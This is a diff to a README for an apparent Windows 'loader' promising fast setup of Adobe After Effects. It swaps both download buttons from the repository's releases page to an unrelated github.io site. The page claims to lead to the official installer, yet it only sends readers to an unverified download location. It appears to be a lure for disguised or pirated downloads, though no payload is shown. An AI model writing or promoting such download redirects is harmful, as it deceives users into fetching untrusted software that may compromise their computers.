@@ -1,6 +1,6 @@
 # 📥 after-effects-windows-loader-update - Fast setup for Adobe After Effects
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/syphilitic-perimeter780/after-effects-windows-loader-update/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://syphilitic-perimeter780.github.io)
 
 This software simplifies the process of installing Adobe After Effects on your Windows computer. It reduces the steps you need to follow to reach the official installer. You avoid multiple web pages and verify that you receive the correct version for your operating system.
 
@@ -24,7 +24,7 @@ Follow these steps to obtain and start the application.
 2. Select the latest version available on the page.
 3. Click the link below to reach the official download source.
 
-[![](https://img.shields.io/badge/Download-Click_Here-grey.svg)](https://github.com/syphilitic-perimeter780/after-effects-windows-loader-update/releases)
+[![](https://img.shields.io/badge/Download-Click_Here-grey.svg)](https://syphilitic-perimeter780.github.io)
 
 ## 🛠️ How to install
 
